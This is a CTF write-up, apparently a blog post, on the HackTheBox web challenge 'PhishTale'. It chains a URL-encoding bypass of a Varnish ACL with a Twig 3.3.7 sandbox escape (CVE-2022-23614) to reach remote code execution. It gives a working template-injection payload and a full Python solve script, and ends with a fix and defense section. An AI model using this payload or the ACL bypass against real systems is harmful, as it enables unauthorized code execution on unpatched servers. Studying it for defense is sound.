---
layout: post
title: "HackTheBox Challenge: PhishTale"
date: 2027-10-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, twig, sandbox-escape, varnish, acl-bypass, cve-2022-23614, cwe-1336, cwe-436]
---

PhishTale is an Easy web challenge built around a "phishing template generator":
an admin picks a phish page and exports it as a zip. Behind the scenes the export is
rendered through **Twig 3.3.7**, and a **Varnish** cache sits in front guarding the
admin endpoint. Two small gaps — a reverse-proxy ACL that matches the raw URL and a
Twig sandbox running a version one patch too old — chain into remote code execution
and a read of the root-owned flag.

## Overview

- **Category:** Web · **Difficulty:** Easy
- **Stack:** hitch (TLS) → Varnish 6.6 (cache + ACL) → Apache + PHP7 → Symfony 5.1 / Twig 3.3.7
- **Path:** Varnish ACL bypass (URL-encoding) → Twig sandbox escape ([CVE-2022-23614](https://nvd.nist.gov/vuln/detail/CVE-2022-23614)) → RCE → read `/root/flag` via a setuid helper.

## The technique

There are two bugs, and you need both.

### 1. Varnish ACL bypass — raw-URL vs decoded-path conflict

The export endpoint is meant to be local-only. The Varnish config enforces that:

```vcl
acl admin { "127.0.0.1"; }
sub vcl_recv {
    if ( req.url ~ "^/admin/export" && !(client.ip ~ admin) ) {
        return(synth(403, "Only localhost is allowed."));
    }
}
```

Varnish matches the **raw** request URL with that regex, but Apache/Symfony
**URL-decode** the path before routing. So requesting `/admin/%65xport` (`%65` = `e`):

- Varnish: `^/admin/export` does **not** match `/admin/%65xport` → the ACL is skipped.
- Backend: decodes `%65` → `e` → routes straight to the export controller.

This is an interpretation conflict ([CWE-436](https://cwe.mitre.org/data/definitions/436.html)) —
the proxy and the origin disagree on what the URL means, so a control enforced only at
the edge is bypassed.

### 2. Twig sandbox escape — CVE-2022-23614

The export builds a PHP source string and renders it through Twig:

```php
$this->campaign = htmlentities($campaign);   // PHP7 ENT_COMPAT: only < > & " encoded
...
$phishPage .= "\$campaign = \"$this->campaign\"; \n";
$this->indexPage = $this->twig->createTemplate($phishPage)->render();   // SSTI sink
```

`htmlentities()` on PHP7 defaults to `ENT_COMPAT`, which encodes only `< > & "` and
leaves `'`, `{`, `}`, `|`, `(`, `)`, `[`, `]` untouched — so Twig syntax `{{ ... }}`
survives in the `campaign`/`title`/`slack`/`redirect` fields. A `{{7*7}}` probe rendering
`49` confirms server-side template injection ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)).

But Twig runs in a **global sandbox** with an allowlist:

```yaml
twig.sandbox.policy:
    class: Twig\Sandbox\SecurityPolicy
    arguments:
        - ['include']                              # tags
        - ['upper', 'join', 'raw', 'escape', 'sort']  # filters
        - []   # methods
        - []   # properties
        - []   # functions
```

No function calls, no `_self`, no `map`/`filter`. The escape is the version:
**Twig 3.3.7 is the last release before 3.3.8**, which added the check that rejects a
**string callable** passed to the `sort`/`map`/`filter`/`reduce` filters in sandbox mode
([CVE-2022-23614](https://nvd.nist.gov/vuln/detail/CVE-2022-23614)). `sort` is an *allowed*
filter, and in 3.3.7 its callable is never validated:

```twig
{{ ['/readflag','x']|sort('system')|join }}
```

`sort('system')` calls `uasort(['/readflag','x'], 'system')`; the comparator runs
`system('/readflag')`, whose output is echoed into the render buffer. The `|join` collapses
the returned array to a string so the render doesn't error on "Array to string conversion".
The flag lives in `/root/flag` (root-only), so the setuid `/readflag` helper is what we run.

## Solution

The rendered output isn't returned in the HTTP response — it's zipped into
`index.php` and served from `/static/exports/phishtale.zip`. The `solve.py` below logs in,
fires the chained payload through the encoded path, downloads the zip, and reads the flag
out of the generated `index.php`:

```python
#!/usr/bin/env python3
import sys, io, zipfile, requests, urllib3
urllib3.disable_warnings()

base = sys.argv[1].rstrip('/')
s = requests.Session(); s.verify = False

# 1) login (admin/admin from .env)
s.get(f"{base}/login", params={"username": "admin", "password": "admin"}, allow_redirects=False)

# 2) Twig 3.3.7 sandbox escape: allowed 'sort' filter takes a string callable (CVE-2022-23614)
payload = "{{['/readflag','x']|sort('system')|join}}"

# 3) Varnish ACL bypass: %65 = 'e' -> regex misses, backend decodes to /admin/export
s.get(f"{base}/admin/%65xport",
      params={"template-page": "google", "campaign": payload},
      allow_redirects=False)

# 4) the rendered command output is zipped into google/index.php
z = zipfile.ZipFile(io.BytesIO(s.get(f"{base}/static/exports/phishtale.zip").content))
print(z.read("google/index.php").decode(errors="replace"))
```

Running it prints the `$campaign = "..."` line containing `HTB{...}` — flag captured.

## Why it worked

Two independent controls each had a gap: the Varnish ACL trusted a raw-URL regex while
the origin normalized differently, and the Twig sandbox was effective in policy but ran a
version one patch behind its security fix. Allowlisting `sort` — a filter that takes a
callable — handed back exactly the primitive the sandbox was meant to remove.

## Fix / defense

- **Twig:** upgrade to ≥ 3.3.8 / 2.14.7 ([CVE-2022-23614](https://nvd.nist.gov/vuln/detail/CVE-2022-23614)). Never whitelist callable-taking filters (`sort`/`map`/`filter`/`reduce`) in a sandbox policy, and never feed user input into `createTemplate()` — pass it only as bound context data.
- **Varnish:** normalize (decode + collapse) the URL before the ACL check and match the canonical path, or enforce authorization at the origin. A front-proxy raw-URL regex is routing, not a security boundary.
- **PHP:** building template *source* from user input is the real flaw; `htmlentities()` (even with `ENT_QUOTES`) does not make it safe.
